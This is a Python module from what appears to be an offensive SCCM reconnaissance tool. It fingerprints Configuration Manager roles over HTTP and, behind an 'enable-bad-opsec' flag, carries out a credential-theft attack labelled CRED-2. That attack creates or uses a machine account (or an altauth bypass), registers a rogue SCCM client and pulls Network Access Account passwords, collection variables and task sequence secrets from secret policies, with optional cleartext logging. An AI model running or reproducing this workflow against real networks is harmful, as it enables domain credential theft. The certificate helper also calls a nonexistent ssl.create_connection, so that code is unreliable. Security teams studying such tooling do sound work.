"""
HTTP collection for ConfigManBearPig.

Translated from PowerShell Invoke-HTTPCollection (lines 8602-8998).

Probes HTTP/HTTPS endpoints to identify:
- Management Points (MP)
- Distribution Points (DP)
- SMS Providers (AdminService)
- Certificate issuer information

Also implements CRED-2 (Misconfiguration-Manager):
When --enable-bad-opsec is set and a Management Point is detected,
registers a machine account as an SCCM client and requests secret
policies to extract NAA credentials, collection variables, and
task sequence secrets.
"""

import logging
import re
import socket
import ssl
import time
import urllib3
from typing import Any, Optional

import requests
from requests_ntlm import HttpNtlmAuth

from lib.ad_resolver import ADResolver
from lib.graph import GraphStore
from lib.targets import CollectionTarget, TargetManager

logger = logging.getLogger("ConfigManBearPig")

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# HTTP endpoints to probe (path, role_type, description)
MP_ENDPOINTS = [
    ("/sms_mp/.sms_aut?mplist", "SMS Management Point", "MP Client List"),
    ("/sms_mp/.sms_aut?mpcert", "SMS Management Point", "MP Certificate"),
    ("/sms_mp/.sms_aut?mplist2", "SMS Management Point", "MP List v2"),
    ("/SMS_MP/.sms_aut?SITESIGNCERT", "SMS Management Point", "Site Signing Cert"),
]

DP_ENDPOINTS = [
    ("/SMS_DP_SMSPKG$/", "SMS Distribution Point", "DP Content"),
    ("/SCCM_BranchDP$/", "SMS Distribution Point", "Branch DP"),
]

SMS_PROVIDER_ENDPOINTS = [
    ("/AdminService/wmi/SMS_Site", "SMS Provider", "AdminService"),
]


def invoke_http_collection(
    target: CollectionTarget,
    ad_resolver: ADResolver,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    username: Optional[str] = None,
    password: Optional[str] = None,
    *,
    enable_bad_opsec: bool = False,
    show_cleartext_passwords: bool = False,
    machine_name: Optional[str] = None,
    machine_pass: Optional[str] = None,
    client_name: Optional[str] = None,
    use_altauth: bool = False,
    registration_sleep: int = 10,
    create_machine_account: Optional[str] = None,
    domain_controller: Optional[str] = None,
) -> None:
    """
    Run HTTP collection against a target.

    Translated from PowerShell Invoke-HTTPCollection (lines 8602-8750).

    Probes various HTTP endpoints to identify SCCM roles.
    When enable_bad_opsec=True and a management point is found,
    attempts CRED-2 policy secret extraction.
    """
    hostname = target.hostname
    logger.info(f"Starting HTTP collection on {hostname}...")

    # Fast port check — skip if neither 80 nor 443 is reachable
    http_open = _check_port(hostname, 80)
    https_open = _check_port(hostname, 443)
    if not http_open and not https_open:
        logger.info(f"HTTP/HTTPS ports not open on {hostname}, skipping HTTP collection")
        return

    session = requests.Session()
    session.verify = False

    if username and password:
        session.auth = HttpNtlmAuth(username, password)

    roles_detected: list[str] = []
    collection_sources: list[str] = []
    site_code: Optional[str] = None
    is_management_point = False

    # Only probe schemes with open ports
    available_schemes = []
    if http_open:
        available_schemes.append("http")
    if https_open:
        available_schemes.append("https")

    # Probe MP endpoints
    for path, role_type, desc in MP_ENDPOINTS:
        for scheme in available_schemes:
            url = f"{scheme}://{hostname}{path}"
            result = _probe_endpoint(session, url)
            if result:
                logger.info(f"Found {role_type} ({desc}): {url}")
                collection_sources.append(f"HTTP-{desc}")

                # Try to extract site code from response
                extracted_code = _extract_site_code(result)
                if extracted_code:
                    site_code = extracted_code

                if role_type not in roles_detected:
                    roles_detected.append(role_type)
                    if "Management Point" in role_type:
                        is_management_point = True
                break  # Found on one scheme, skip the other

    # Probe DP endpoints
    for path, role_type, desc in DP_ENDPOINTS:
        for scheme in available_schemes:
            url = f"{scheme}://{hostname}{path}"
            result = _probe_endpoint(session, url)
            if result:
                logger.info(f"Found {role_type} ({desc}): {url}")
                collection_sources.append(f"HTTP-{desc}")
                if role_type not in roles_detected:
                    roles_detected.append(role_type)
                break

    # Probe AdminService endpoints (HTTPS only)
    for path, role_type, desc in SMS_PROVIDER_ENDPOINTS:
        if not https_open:
            break
        url = f"https://{hostname}{path}"
        result = _probe_endpoint(session, url)
        if result:
            logger.info(f"Found {role_type} ({desc}): {url}")
            collection_sources.append(f"HTTP-{desc}")
            if role_type not in roles_detected:
                roles_detected.append(role_type)

            # Get THIS provider's site code via SMS_Identification (not SMS_Site
            # which returns all sites in the hierarchy). Matches PowerShell
            # behavior of using ThisSiteCode.
            ident_url = f"https://{hostname}/AdminService/wmi/SMS_Identification"
            ident_result = _probe_endpoint(session, ident_url)
            if isinstance(ident_result, dict):
                ident_items = ident_result.get("value", [])
                for item in ident_items:
                    sc = item.get("ThisSiteCode")
                    if sc:
                        site_code = sc
                        break

            # Fall back to SMS_Site only if SMS_Identification didn't work
            if not site_code and isinstance(result, dict):
                items = result.get("value", [])
                for item in items:
                    sc = item.get("SiteCode")
                    if sc:
                        site_code = sc
                        break

    # Check certificate issuer
    cert_issuer = _get_cert_issuer(hostname)
    if cert_issuer:
        logger.info(f"Certificate issuer on {hostname}: {cert_issuer}")

    # Update nodes with detected roles
    if roles_detected:
        if target.sid:
            role_strings = []
            for role in roles_detected:
                if site_code:
                    role_strings.append(f"{role}@{site_code}")
                else:
                    role_strings.append(role)

            graph.upsert_node(
                target.sid,
                ["Computer", "Base"],
                properties={
                    "collectionSource": collection_sources,
                    "SCCMInfra": True,
                    "SCCMSiteSystemRoles": role_strings,
                },
                ad_object=target.ad_object,
            )

        if site_code:
            graph.upsert_node(
                site_code,
                ["SCCM_Site"],
                properties={
                    "collectionSource": collection_sources,
                    "SCCMInfra": True,
                    "siteCode": site_code,
                },
            )

    # CRED-2: Register machine account and extract policy secrets
    if is_management_point and enable_bad_opsec:
        _attempt_cred2_policy_extraction(
            hostname=hostname,
            domain=domain,
            graph=graph,
            ad_resolver=ad_resolver,
            target_manager=target_manager,
            http_open=http_open,
            https_open=https_open,
            machine_name=machine_name,
            machine_pass=machine_pass,
            client_name=client_name,
            use_altauth=use_altauth,
            registration_sleep=registration_sleep,
            show_cleartext_passwords=show_cleartext_passwords,
            cert_issuer=cert_issuer,
            create_machine_account=create_machine_account,
            domain_controller=domain_controller,
            domain_username=username,
            domain_password=password,
            site_code=site_code,
        )

    logger.info(f"HTTP collection completed for {hostname}")


def _attempt_cred2_policy_extraction(
    hostname: str,
    domain: str,
    graph: GraphStore,
    ad_resolver: ADResolver,
    target_manager: TargetManager,
    http_open: bool,
    https_open: bool,
    machine_name: Optional[str],
    machine_pass: Optional[str],
    client_name: Optional[str],
    use_altauth: bool,
    registration_sleep: int,
    show_cleartext_passwords: bool,
    cert_issuer: Optional[str],
    create_machine_account: Optional[str] = None,
    domain_controller: Optional[str] = None,
    domain_username: Optional[str] = None,
    domain_password: Optional[str] = None,
    site_code: Optional[str] = None,
) -> None:
    """
    Implement CRED-2: Register SCCM client and extract secret policies.

    Requires either:
    - Machine account credentials (--machine-name, --machine-pass)
    - Auto-create a machine account (--create-machine-account [NAME], needs domain creds)
    - OR altauth endpoint (--use-altauth)

    Unauthenticated registration will NOT be attempted — SCCM's default
    setting requires domain computer authentication for client approval.
    """
    try:
        from lib.sccm_client import SCCMPolicyClient, create_machine_account as ldap_create_machine
    except ImportError as e:
        logger.warning(f"CRED-2 requires cryptography library: {e}")
        return

    # --- Machine account validation ---
    if not machine_name and not use_altauth:
        if create_machine_account is not None:
            # Auto-create a machine account using domain credentials
            # create_machine_account is "auto" or a user-specified name
            if not domain_username or not domain_password:
                logger.warning(
                    "CRED-2: --create-machine-account requires domain credentials (-u/-p). Skipping."
                )
                return
            if not domain_controller:
                logger.warning(
                    "CRED-2: --create-machine-account requires a domain controller (-dc). Skipping."
                )
                return
            # Determine machine name: None = auto-generate, or user-specified
            create_name = None if create_machine_account == "auto" else create_machine_account
            try:
                machine_name, machine_pass = ldap_create_machine(
                    domain=domain,
                    domain_controller=domain_controller,
                    username=domain_username,
                    password=domain_password,
                    machine_name=create_name,
                    machine_password=machine_pass,  # Use --machine-pass if provided, else auto-generate
                )
                if show_cleartext_passwords:
                    logger.info(f"  Auto-created machine account: {machine_name} / {machine_pass}")
                else:
                    logger.info(f"  Auto-created machine account: {machine_name} / (use --show-cleartext-passwords)")
            except RuntimeError as e:
                logger.warning(f"CRED-2: Failed to create machine account: {e}")
                return
        else:
            logger.warning(
                "CRED-2: Machine account credentials required for client registration. "
                "SCCM's default setting (Automatically approve computers in trusted domains) "
                "requires authentication as a domain computer.\n"
                "  Options:\n"
                "    --machine-name DOMAIN\\\\MACHINE$ --machine-pass PASSWORD  (use existing machine account)\n"
                "    --create-machine-account [NAME]  (create via MachineAccountQuota using -u/-p domain creds)\n"
                "    --use-altauth  (bypass via alternate auth endpoint, HTTPS only)"
            )
            return

    # Generate client name if not provided
    if not client_name:
        import uuid
        short_id = str(uuid.uuid4())[:8]
        client_name = f"CMBP-{short_id}.{domain}"

    # Build list of schemes to try — prefer HTTPS, fall back to HTTP
    schemes_to_try = []
    if https_open:
        schemes_to_try.append("https")
    if http_open:
        schemes_to_try.append("http")

    client = None
    registered = False

    for scheme in schemes_to_try:
        mp_url = f"{scheme}://{hostname}"

        logger.info(f"CRED-2: Attempting policy secret extraction from {mp_url}")
        logger.info(f"  Client name: {client_name}")

        if machine_name and machine_pass:
            logger.info(f"  Machine account: {machine_name}")
        elif use_altauth:
            logger.info("  Using altauth endpoint (no machine credentials needed)")

        try:
            client = SCCMPolicyClient(
                management_point=mp_url,
                client_name=client_name,
                machine_name=machine_name,
                machine_pass=machine_pass,
                use_altauth=use_altauth,
            )

            # Register
            guid = client.register_client()
            registered = True
            break  # Registration succeeded
        except RuntimeError as e:
            if "Empty response" in str(e) and len(schemes_to_try) > 1 and scheme == "https":
                logger.info(f"  HTTPS registration returned empty response, trying HTTP fallback...")
                if client:
                    client.cleanup()
                    client = None
                continue
            logger.warning(f"  CRED-2 failed: {e}")
            if client:
                client.cleanup()
            return
        except Exception as e:
            logger.warning(f"  CRED-2 failed: {e}")
            if client:
                client.cleanup()
            return

    if not registered or not client:
        logger.warning("  CRED-2: Registration failed on all available schemes")
        return

    try:
        # Wait for device to be assigned to collections
        logger.info(f"  Waiting {registration_sleep}s for SCCM to assign device to collections...")
        time.sleep(registration_sleep)

        # Request policies
        policies = client.request_policies()

        if not client.secret_policies:
            logger.info("  No secret policies found — device may not be approved or no NAA configured")
            return

        # Extract secrets
        secrets = client.extract_secrets(show_cleartext=show_cleartext_passwords)

        # Create graph nodes for discovered credentials
        from lib.secret_utils import (
            create_secret_node,
            extract_domain_users,
            resolve_and_create_secret_user,
        )

        for naa in secrets.get("naa_accounts", []):
            naa_user = naa.get("username", "")
            naa_pass = naa.get("password", "")
            if naa_user:
                logger.info(f"  Found NAA credential: {naa_user if show_cleartext_passwords else '(hidden)'}")
                resolve_and_create_secret_user(
                    ad_resolver, graph, naa_user, "NAA", site_code, "HTTP-CRED2",
                )
            if naa_pass:
                create_secret_node(
                    graph, "NAA_Password", naa_pass, site_code, "HTTP-CRED2",
                    name="NAA Password", show_cleartext=show_cleartext_passwords,
                )

        for cv in secrets.get("collection_variables", []):
            cv_name = cv.get("name", "unknown")
            cv_value = cv.get("value", "")
            logger.info(f"  Found collection variable: {cv_name}")
            # Extract domain users from the value
            domain_users = extract_domain_users(cv_value) if cv_value else []
            for du in domain_users:
                resolve_and_create_secret_user(
                    ad_resolver, graph, du, "CollectionVariable", site_code,
                    "HTTP-CRED2", extra_props={"collectionVariableName": cv_name},
                )
            if not domain_users and cv_value and cv_value not in ("(encrypted)", "(decrypted - use --show-cleartext-passwords)"):
                create_secret_node(
                    graph, "CollectionVariable", cv_value, site_code, "HTTP-CRED2",
                    name=cv_name, show_cleartext=show_cleartext_passwords,
                )

        for ts in secrets.get("task_sequences", []):
            logger.info(f"  Found task sequence script ({len(ts)} chars)")
            domain_users = extract_domain_users(ts) if ts else []
            for du in domain_users:
                resolve_and_create_secret_user(
                    ad_resolver, graph, du, "TaskSequence", site_code, "HTTP-CRED2",
                )
            if not domain_users and ts:
                create_secret_node(
                    graph, "TaskSequence", ts, site_code, "HTTP-CRED2",
                    name="Task Sequence Script", show_cleartext=show_cleartext_passwords,
                )

        # Analyze cert issuer for ELEVATE-5
        if cert_issuer:
            # Check if cert is ADCS-issued
            is_sccm_self = cert_issuer and ("SMS" in cert_issuer or "ConfigMgr" in cert_issuer)
            if not is_sccm_self:
                logger.info(f"  Management Point uses PKI certificate from: {cert_issuer}")
                logger.info(f"  ClientCertificateRequired may be True — check for ELEVATE-5")

    except Exception as e:
        logger.warning(f"  CRED-2 failed: {e}")
    finally:
        if client:
            client.cleanup()


def _check_port(host: str, port: int, timeout: float = 3.0) -> bool:
    """Fast TCP port check."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _probe_endpoint(
    session: requests.Session,
    url: str,
    timeout: int = 5,
) -> Optional[Any]:
    """
    Probe an HTTP endpoint.

    Returns response content if accessible (200), None otherwise.
    """
    try:
        response = session.get(url, timeout=timeout, allow_redirects=True)
        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                return response.text
        elif response.status_code in (401, 403):
            # Endpoint exists but requires auth
            return True
        return None
    except requests.exceptions.SSLError:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None


def _extract_site_code(response_data: Any) -> Optional[str]:
    """Extract SCCM site code from response data."""
    if isinstance(response_data, str):
        # Look for site code patterns in XML/text responses
        match = re.search(r'SiteCode="(\w{3})"', response_data)
        if match:
            return match.group(1)
        match = re.search(r"<SiteCode>(\w{3})</SiteCode>", response_data)
        if match:
            return match.group(1)
    elif isinstance(response_data, dict):
        return response_data.get("SiteCode")

    return None


def _get_cert_issuer(hostname: str, port: int = 443) -> Optional[str]:
    """
    Get the certificate issuer for HTTPS endpoints.

    Translated from PowerShell Get-ManagementPointCertIssuer (lines 8952-8998).
    """
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with ssl.create_connection((hostname, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                if cert:
                    issuer = dict(x[0] for x in cert.get("issuer", []))
                    return issuer.get("commonName") or issuer.get("organizationName")
    except Exception:
        pass

    return None
